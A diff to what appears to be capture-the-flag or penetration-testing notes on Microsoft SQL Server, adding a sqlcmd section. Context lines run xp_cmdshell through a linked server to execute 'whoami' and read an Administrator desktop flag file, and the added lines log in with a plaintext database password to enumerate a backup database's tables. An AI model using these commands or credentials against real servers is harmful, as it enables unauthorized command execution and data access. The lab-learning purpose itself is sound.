@@ -433,6 +433,13 @@ EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
 EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
 ```
 
+### sqlcmd.exe
+```powershell
+where.exe sqlcmd
+
+sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
+```
+
 </details>
 
 ---
